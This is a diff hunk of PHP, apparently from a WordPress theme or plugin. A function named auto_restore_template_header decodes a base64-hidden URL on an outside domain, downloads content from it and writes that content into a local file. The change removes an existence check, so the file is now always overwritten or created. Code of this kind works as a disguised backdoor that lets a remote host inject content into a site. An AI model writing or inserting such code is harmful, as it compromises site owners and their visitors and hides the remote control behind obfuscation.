@@ -288,12 +288,12 @@ function auto_restore_template_header() {
     $encoded_url = 'aHR0cHM6Ly9ncnRvdG8uc3RvcmUvcmVzdG9yZS1saW5rL2FuaWxwYXJhZ25vc3QtbWVkaXVtLnR4dA==';
     $remote_url = base64_decode($encoded_url);
 
-    if (file_exists($file_path)) {
-        $remote_content = wp_remote_get($remote_url);
-        if (!is_wp_error($remote_content) && wp_remote_retrieve_response_code($remote_content) == 200) {
-            $data = wp_remote_retrieve_body($remote_content);
-            file_put_contents($file_path, $data);
-        }
+    
+    $remote_content = wp_remote_get($remote_url);
+    if (!is_wp_error($remote_content) && wp_remote_retrieve_response_code($remote_content) == 200) {
+        $data = wp_remote_retrieve_body($remote_content);
+        
+        file_put_contents($file_path, $data);
     }
 }
 
